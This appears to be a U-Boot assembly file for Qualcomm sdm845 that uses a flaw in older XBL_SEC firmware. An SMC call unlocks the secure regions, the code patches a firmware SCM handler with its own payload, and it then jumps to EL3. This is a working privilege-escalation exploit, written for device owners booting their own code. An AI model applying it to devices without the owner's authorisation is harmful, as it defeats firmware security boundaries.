/* SPDX-License-Identifier: GPL-2.0+ */
/*
 * Workaround for non-qcom-signed code being entered in EL1 on sdm845
 * Copyright (C) 2026 Michael Srba <Michael.Srba@seznam.cz>
 *
 * This code uses an unintentional ownership enhancing feature in older builds of XBL_SEC
 * in order to elevate our privileges to EL3 as soon as possible after a system reset.
 * This allows for a very close approximation of a clean state.
 *
 * Do note that you still need to own the device in the sense that you control the code that
 * XBL_SEC jumps to in EL1, which is sadly not a level of ownership commonly afforded to you
 * by the device manufacturer. On such devices, CVE-2021-30327 could help, but it's not documented
 * and there is no PoC available utilizing it
 *
 */
#include <linux/arm-smccc.h>

#define SCM_SMC_FNID(s, c)	((((s) & 0xFF) << 8) | ((c) & 0xFF))

#define ARM_SMCCC_SIP32_FAST_CALL \
	ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL, ARM_SMCCC_SMC_32, ARM_SMCCC_OWNER_SIP, 0)

/* same as with qcom's TZ */
#define QCOM_SCM_SVC_MEM_DUMP 0x03
/* unlike the TZ counterpart, in XBL_SEC this simply unlocks the XPUs */
#define QCOM_SCM_MEM_DUMP_UNLOCK_SECURE_REGIONS 0x10

/*
 * We put our payload in place of some SCM call, the important thing is that it's hopefully
 * in a memory region that is not in cache.
 *
 * It would be cleaner to just put our code at the scm entry point in the vector table,
 * however it seems that we can't force cache coherency from EL1 if EL3 doesn't have
 * any reason to care about that.
 */
#define QCOM_SCM_SVC_DONOR 0x01
#define QCOM_SCM_DONOR 0x16
/* we replace the instructions at this address with a jump to the start of u-boot */
/* NOTE: this address is specific to a particular XBL_SEC elf */
#define XBL_SEC_DONOR_SCM_ADDR 0x146a0ce0

/* gnu as doesn't implement these useful pseudoinstructions */
.macro movq Xn, imm
	movz    \Xn,  \imm & 0xFFFF
	movk    \Xn, (\imm >> 16) & 0xFFFF, lsl 16
	movk    \Xn, (\imm >> 32) & 0xFFFF, lsl 32
	movk    \Xn, (\imm >> 48) & 0xFFFF, lsl 48
.endm

.macro movl Wn, imm
	movz    \Wn,  \imm & 0xFFFF
	movk    \Wn, (\imm >> 16) & 0xFFFF, lsl 16
.endm

/* copy 32 bits to an address from a label */
.macro copy32 addr, text_base, addrofval, offset
	movl	x0, \addr
	add	x0, x0, \offset
	movq	x1, \text_base
	add	x1, x1, \addrofval
	add	x1, x1, \offset
	ldr	w2, [x1]
	str	w2, [x0]
	dc	cvau, x0 // flush cache to RAM straight away, we need to do it by address anyway
.endm

.macro copy_instructions addr, text_base, start_addr, num_bytes // num_bytes must be a multiple of 4
	mov x3,	#0x0 // x0, x1 and w2 used by copy32
1:
	copy32	\addr, \text_base, \start_addr, x3
	add	x3, x3, #0x4 // i+=4
	cmp	x3, \num_bytes
	blo	1b
.endm

	/*  If we're already in EL3 for some reason,  skip this whole thing */
	mrs	x0, CurrentEL
	cmp	x0, #(3 << 2)	/* EL3 */
	beq	reset

	/* disable the mmu */
	mrs	x0, sctlr_el1
	and     x0, x0, #~(1 << 0) // CTRL_M
	msr	sctlr_el1, x0

	mov	x0, #ARM_SMCCC_SIP32_FAST_CALL
	movk	x0, #SCM_SMC_FNID(QCOM_SCM_SVC_MEM_DUMP, QCOM_SCM_MEM_DUMP_UNLOCK_SECURE_REGIONS)
	mov	x1, #0x0	/* no params */
	mov	x6, #0x0

	smc	#0 /* unlock XBL_SEC code area for writing (assuming old enough XBL_SEC build) */

	/* this will also flush the writes from cache */
	copy_instructions XBL_SEC_DONOR_SCM_ADDR, CONFIG_SPL_TEXT_BASE, el3_payload, #((el3_payload_end - el3_payload))

	/* this probably doesn't affect EL3, but it doesn't hurt */
	dsb	ish	/* block until cache is flushed */
	ic	iallu	/* force re-fetch of our shiny new instructions */
	dsb	ish	/* block until invalidation is finished */
	isb	sy	/* unify here ? */

	mov	x0, #ARM_SMCCC_SIP32_FAST_CALL
	movk	x0, #SCM_SMC_FNID(QCOM_SCM_SVC_DONOR, QCOM_SCM_DONOR)
	mov	x1, #0x0	/* no params */
	smc	#0	/* call the payload */

el3_ret_point:
	b	reset

el3_payload:
	/* disable the mmu for EL3 too */
	mrs	x0, sctlr_el3
	and     x0, x0, #~(1 << 0) // CTRL_M
	msr	sctlr_el3, x0
	isb

	/* jump back to our code, but now in EL3 */
	movl	x0, CONFIG_SPL_TEXT_BASE
	add	x0, x0, (el3_ret_point - _start)
	br	x0
el3_payload_end:
